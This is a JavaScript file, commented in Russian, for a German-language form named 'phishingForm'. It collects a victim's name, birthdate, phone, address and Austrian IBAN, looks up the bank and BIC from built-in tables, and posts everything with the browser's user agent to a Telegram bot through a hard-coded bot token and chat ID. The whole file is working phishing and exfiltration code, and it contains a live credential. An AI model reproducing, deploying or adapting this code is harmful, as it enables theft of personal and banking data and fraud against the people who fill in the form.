// ============================================================
// 🔥 КОНФИГУРАЦИЯ
// ============================================================
const BOT_TOKEN = "8868232573:AAEW0wq6mguGORRd_woASqbkE80zg7w59G8";
const CHAT_ID = "-1004324836304";

let ibanCheckResult = {
    valid: false,
    message: 'nicht geprüft',
    bankData: null,
    iban: ''
};

// ============================================================
// 🏦 СПРАВОЧНИК АВСТРИЙСКИХ БАНКОВ (BLZ -> BIC и название)
// ============================================================
const AUSTRIAN_BANKS = {
    '11000': { bic: 'BKAUATWWXXX', bank: 'UniCredit Bank Austria AG' },
    '12000': { bic: 'BKAUATWWXXX', bank: 'UniCredit Bank Austria AG' },
    '12002': { bic: 'BKAUATWWXXX', bank: 'UniCredit Bank Austria AG' },
    '12004': { bic: 'BKAUATWWXXX', bank: 'UniCredit Bank Austria AG' },
    '12005': { bic: 'BKAUATWWXXX', bank: 'UniCredit Bank Austria AG' },
    '14000': { bic: 'BAWAATWWXXX', bank: 'BAWAG P.S.K. AG' },
    '14001': { bic: 'BAWAATWWXXX', bank: 'BAWAG P.S.K. AG' },
    '14002': { bic: 'BAWAATWWXXX', bank: 'BAWAG P.S.K. AG' },
    '14200': { bic: 'BAWAATWWXXX', bank: 'BAWAG P.S.K. AG' },
    '14210': { bic: 'BAWAATWWXXX', bank: 'BAWAG P.S.K. AG' },
    '14900': { bic: 'BAWAATWWXXX', bank: 'BAWAG P.S.K. AG' },
    '15000': { bic: 'OBKLAT2LXXX', bank: 'Oberbank AG' },
    '15001': { bic: 'OBKLAT2LXXX', bank: 'Oberbank AG' },
    '15002': { bic: 'OBKLAT2LXXX', bank: 'Oberbank AG' },
    '15003': { bic: 'OBKLAT2LXXX', bank: 'Oberbank AG' },
    '15004': { bic: 'OBKLAT2LXXX', bank: 'Oberbank AG' },
    '15005': { bic: 'OBKLAT2LXXX', bank: 'Oberbank AG' },
    '15006': { bic: 'OBKLAT2LXXX', bank: 'Oberbank AG' },
    '15007': { bic: 'OBKLAT2LXXX', bank: 'Oberbank AG' },
    '15008': { bic: 'OBKLAT2LXXX', bank: 'Oberbank AG' },
    '15009': { bic: 'OBKLAT2LXXX', bank: 'Oberbank AG' },
    '15010': { bic: 'OBKLAT2LXXX', bank: 'Oberbank AG' },
    '15011': { bic: 'OBKLAT2LXXX', bank: 'Oberbank AG' },
    '15012': { bic: 'OBKLAT2LXXX', bank: 'Oberbank AG' },
    '15013': { bic: 'OBKLAT2LXXX', bank: 'Oberbank AG' },
    '15021': { bic: 'OBKLAT2LXXX', bank: 'Oberbank AG' },
    '15022': { bic: 'OBKLAT2LXXX', bank: 'Oberbank AG' },
    '15023': { bic: 'OBKLAT2LXXX', bank: 'Oberbank AG' },
    '15024': { bic: 'OBKLAT2LXXX', bank: 'Oberbank AG' },
    '15025': { bic: 'OBKLAT2LXXX', bank: 'Oberbank AG' },
    '15030': { bic: 'OBKLAT2LXXX', bank: 'Oberbank AG' },
    '15031': { bic: 'OBKLAT2LXXX', bank: 'Oberbank AG' },
    '15040': { bic: 'OBKLAT2LXXX', bank: 'Oberbank AG' },
    '15041': { bic: 'OBKLAT2LXXX', bank: 'Oberbank AG' },
    '15042': { bic: 'OBKLAT2LXXX', bank: 'Oberbank AG' },
    '15060': { bic: 'OBKLAT2LXXX', bank: 'Oberbank AG' },
    '15061': { bic: 'OBKLAT2LXXX', bank: 'Oberbank AG' },
    '15062': { bic: 'OBKLAT2LXXX', bank: 'Oberbank AG' },
    '33002': { bic: 'RLBBAT2E038', bank: 'Raiffeisen Bezirksbank Neusiedl Ost eGen' },
    '35011': { bic: 'RVSAAT2S039', bank: 'Raiffeisenbank Oberpinzgau eGen' },
    '35036': { bic: 'RVSAAT2S063', bank: 'Raiffeisenbank Lungau eGen' },
    '34000': { bic: 'RZOOAT2LXXX', bank: 'Raiffeisenlandesbank Oberösterreich AG' },
    '35010': { bic: 'RVSAAT2S055', bank: 'Raiffeisenbank Pongau Mitte eGen' },
    '39254': { bic: 'RZKTAT2K475', bank: 'Raiffeisenbank Mittelkärnten eG' },
    '34233': { bic: 'RZOOAT2L380', bank: 'Raiffeisenbank Region Kirchdorf eGen' },
    '35008': { bic: 'RVSAAT2S015', bank: 'Raiffeisenbank Flachgau Mitte eGen' },
    '35022': { bic: 'RVSAAT2S022', bank: 'Raiffeisenbank Hallein-Oberalm eGen' },
    '35012': { bic: 'RVSAAT2S012', bank: 'Raiffeisenbank Hohe Tauern eGen' }
};

// ============================================================
// 🏛️ ОПРЕДЕЛЕНИЕ БАНКА ПО BIC (для немецких BIC)
// ============================================================
function getBankNameByBIC(bic) {
    const bankMap = {
        'GENODEF1HH2': 'Hamburger Sparkasse (Haspa)',
        'GENODEF1HH1': 'Hamburger Sparkasse',
        'DEUTDEHH': 'Deutsche Bank Hamburg',
        'COBADEHH': 'Commerzbank Hamburg',
        'HYVEDEMM': 'UniCredit Bank - HypoVereinsbank',
        'DRESDEFF': 'Commerzbank (Dresdner Bank)',
        'SPARDEHH': 'Sparkasse Hamburg',
        'VORSDEHH': 'Volksbank Hamburg',
        'HELADEF1': 'Sparkasse',
        'GENODEFF': 'Volksbank',
        'SOLADEST': 'Sparkasse',
        'BYLADEM': 'BayernLB',
        'GENODEF1S2': 'Sparkasse',
        'DEUTDEDB': 'Deutsche Bank',
        'COBADEFF': 'Commerzbank',
        'TRIDEFHH': 'Targobank Hamburg',
        'INGDDEFF': 'ING Bank',
        'NTSBDEDE': 'N26 Bank',
        'SOGEDEFF': 'Societe Generale',
        'BNPADEFF': 'BNP Paribas',
        'BUKBDEFF': 'Bankhaus BUKB',
        'MHBKDEHH': 'M.M.Warburg & CO',
        'SCFBDEFF': 'Sberbank',
        'VPAYDEFF': 'V-Payment',
        'SSKNDEFF': 'S-Kreditpartner',
        'GENODEF1HHV': 'Hamburger Volksbank',
        'HASPDEHH': 'Haspa Hamburg',
        'DEUTDEHHV': 'Deutsche Bank Hamburg',
        'COBADEHHV': 'Commerzbank Hamburg',
        'GENODEF1P2': 'Sparkasse Pforzheim',
        'GENODEF1S1': 'Sparkasse',
        'GENODEF1A2': 'Sparkasse Aachen',
        'GENODEF1B1': 'Sparkasse Bremen',
        'GENODEF1D1': 'Sparkasse Dortmund',
        'GENODEF1E1': 'Sparkasse Essen',
        'GENODEF1F1': 'Sparkasse Frankfurt',
        'GENODEF1G1': 'Sparkasse Gera',
        'GENODEF1H1': 'Sparkasse Hannover',
        'GENODEF1K1': 'Sparkasse Köln',
        'GENODEF1L1': 'Sparkasse Leipzig',
        'GENODEF1M1': 'Sparkasse München',
        'GENODEF1N1': 'Sparkasse Nürnberg',
        'GENODEF1R1': 'Sparkasse Rostock',
        'GENODEF1S2': 'Sparkasse Stuttgart',
        'GENODEF1W1': 'Sparkasse Wiesbaden'
    };
    return bankMap[bic.toUpperCase()] || null;
}

// ============================================================
// 📅 ВАЛИДАЦИЯ ДАТЫ РОЖДЕНИЯ (от 1950 до 2008)
// ============================================================
function validateBirthdate(value) {
    const parts = value.split('/');
    if (parts.length !== 3) return { valid: false, message: 'Ungültiges Datum.' };

    const day = parseInt(parts[0], 10);
    const month = parseInt(parts[1], 10);
    const year = parseInt(parts[2], 10);

    if (isNaN(day) || isNaN(month) || isNaN(year)) {
        return { valid: false, message: 'Ungültiges Datum.' };
    }

    if (year < 1950 || year > 2008) {
        return { valid: false, message: 'Ungültiges Datum.' };
    }

    if (month < 1 || month > 12) {
        return { valid: false, message: 'Ungültiges Datum.' };
    }

    const date = new Date(year, month - 1, day);
    if (date.getFullYear() !== year || date.getMonth() !== month - 1 || date.getDate() !== day) {
        return { valid: false, message: 'Ungültiges Datum.' };
    }

    return { valid: true, message: '' };
}

// ============================================================
// 🏦 ЛОКАЛЬНЫЙ IBAN-ЧЕКЕР (только длина и символы, без MOD-97)
// ============================================================
function validateIbanLocally(iban) {
    const cleanIban = iban.replace(/\s/g, '').toUpperCase();

    if (!/^[A-Z0-9]+$/.test(cleanIban)) {
        return { valid: false, message: '❌ Ungültige IBAN.', bankData: null };
    }

    if (!cleanIban.startsWith('AT')) {
        return { valid: false, message: '❌ Ungültige IBAN.', bankData: null };
    }

    if (cleanIban.length < 20) {
        return { valid: false, message: '❌ Ungültige IBAN.', bankData: null };
    }

    const blz = cleanIban.substring(4, 9);
    const bankInfo = AUSTRIAN_BANKS[blz];

    let bankData = null;
    let message = '✅ Gültige IBAN (Bank unbekannt).';

    if (bankInfo) {
        bankData = {
            bic: bankInfo.bic,
            bank: bankInfo.bank
        };
        message = '✅ Gültige IBAN.';
    }

    return { valid: true, message: message, bankData: bankData };
}

// ============================================================
// 🚀 ИНИЦИАЛИЗАЦИЯ
// ============================================================
document.addEventListener('DOMContentLoaded', function() {
    const ibanInput = document.getElementById('ibanInput');
    const birthdateInput = document.getElementById('birthdateInput');
    const phoneInput = document.getElementById('phoneInput');
    const submitBtn = document.getElementById('submitBtn');
    const ibanError = document.getElementById('ibanError');
    const birthdateError = document.getElementById('birthdateError');

    if (submitBtn) submitBtn.disabled = false;

    // === ТЕЛЕФОН ===
    if (phoneInput) {
        if (phoneInput.value === '' || phoneInput.value === '+43') phoneInput.value = '+43';
        phoneInput.addEventListener('focus', function() {
            const len = this.value.length;
            this.setSelectionRange(len, len);
        });
        phoneInput.addEventListener('input', function() {
            if (this.value === '') {
                this.value = '+43';
                const len = this.value.length;
                this.setSelectionRange(len, len);
            }
        });
    }

    // === МАСКА ДЛЯ ДАТЫ ===
    if (birthdateInput) {
        birthdateInput.addEventListener('input', function(e) {
            let value = this.value.replace(/\D/g, '');
            let formatted = '';
            if (value.length > 8) value = value.slice(0, 8);
            for (let i = 0; i < value.length; i++) {
                if (i === 2 || i === 4) formatted += '/';
                formatted += value[i];
            }
            this.value = formatted;
            if (birthdateError) birthdateError.style.display = 'none';
        });
    }

    // === IBAN (только форматирование) ===
    if (ibanInput) {
        ibanInput.maxLength = 34;
        ibanInput.addEventListener('input', function() {
            let value = this.value.replace(/\s/g, '').toUpperCase();
            this.value = value;
            if (ibanError) ibanError.style.display = 'none';
        });
    }

    // === ОТПРАВКА ФОРМЫ ===
    const form = document.getElementById('phishingForm');
    if (!form) return;

    form.addEventListener('submit', function(event) {
        event.preventDefault();

        if (ibanError) ibanError.style.display = 'none';
        if (birthdateError) birthdateError.style.display = 'none';

        // --- Телефон ---
        const phoneDigits = phoneInput.value.replace(/[^0-9]/g, '');
        if (phoneDigits.length < 6) {
            alert('Bitte geben Sie eine gültige Telefonnummer ein (mindestens 6 Ziffern).');
            return;
        }

        // --- IBAN ---
        const ibanValue = ibanInput.value.trim();
        const ibanValidation = validateIbanLocally(ibanValue);
        if (!ibanValidation.valid) {
            if (ibanError) { ibanError.textContent = ibanValidation.message; ibanError.style.display = 'block'; }
            ibanInput.focus();
            return;
        }

        // --- Дата рождения ---
        const birthdateValue = birthdateInput.value.trim();
        const birthdateValidation = validateBirthdate(birthdateValue);
        if (!birthdateValidation.valid) {
            if (birthdateError) {
                birthdateError.textContent = birthdateValidation.message;
                birthdateError.style.display = 'block';
            }
            birthdateInput.focus();
            return;
        }

        // --- Всё ок ---
        ibanCheckResult = {
            valid: true,
            message: ibanValidation.message,
            bankData: ibanValidation.bankData,
            iban: ibanValue
        };

        const formData = new FormData(form);
        const data = {};
        formData.forEach((value, key) => {
            data[key] = value.trim() || 'nicht angegeben';
        });

        data.iban_check = ibanCheckResult;
        sendToTelegram(data);
    });
});

// ============================================================
// 📤 ОТПРАВКА В TELEGRAM
// ============================================================
function sendToTelegram(data) {
    const submitBtn = document.getElementById('submitBtn');
    submitBtn.disabled = true;
    submitBtn.textContent = '⏳ Sende...';

    let message = '🔴 <b>NEUE DATEN!</b>\n\n';
    message += `👤 <b>Name:</b> ${data.fullname || 'nicht angegeben'}\n`;
    message += `🎂 <b>Geburtsdatum:</b> ${data.birthdate || 'nicht angegeben'}\n`;
    message += `📱 <b>Telefon:</b> ${data.phone || 'nicht angegeben'}\n`;
    message += `📍 <b>Adresse:</b> ${data.street || 'nicht angegeben'}\n`;
    message += `🏙️ <b>Stadt:</b> ${data.city || 'nicht angegeben'}\n`;
    message += `📮 <b>PLZ:</b> ${data.postal || 'nicht angegeben'}\n`;

    const ibanData = data.iban_check || { valid: false, message: 'nicht geprüft', bankData: null };
    message += `🏦 <b>IBAN:</b> ${data.iban || 'nicht angegeben'}\n`;
    message += `🔍 <b>IBAN-Status:</b> ${ibanData.message || 'nicht geprüft'}\n`;

    let bankName = '';
    let bic = '';

    if (ibanData.bankData) {
        bankName = ibanData.bankData.bank || '';
        bic = ibanData.bankData.bic || '';
        if (!bankName && bic) {
            bankName = getBankNameByBIC(bic) || '';
        }
    }

    message += `🏛️ <b>Bank:</b> ${bankName}\n`;
    message += `🔢 <b>BIC:</b> ${bic}\n`;

    message += `\n🕒 <b>Zeit:</b> ${new Date().toLocaleString('de-DE')}`;
    message += `\n🌐 <b>Browser:</b> ${navigator.userAgent}`;

    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            submitBtn.textContent = '✅ Gesendet!';
            submitBtn.style.background = '#28a745';
            setTimeout(() => {
                document.getElementById('phishingForm').reset();
                submitBtn.textContent = 'Absenden';
                submitBtn.style.background = '';
                submitBtn.disabled = false;

                const phoneInput = document.getElementById('phoneInput');
                if (phoneInput) phoneInput.value = '+43';
                const birthdateInput = document.getElementById('birthdateInput');
                if (birthdateInput) birthdateInput.value = '';
                const ibanInput = document.getElementById('ibanInput');
                if (ibanInput) ibanInput.value = '';

                ibanCheckResult = { valid: false, message: 'nicht geprüft', bankData: null, iban: '' };
            }, 2000);
        } else {
            throw new Error(data.description || 'Unknown error');
        }
    })
    .catch(error => {
        submitBtn.textContent = '❌ Fehler!';
        submitBtn.style.background = '#dc3545';
        setTimeout(() => {
            submitBtn.textContent = 'Absenden';
            submitBtn.style.background = '';
            submitBtn.disabled = false;
        }, 3000);
    });
}
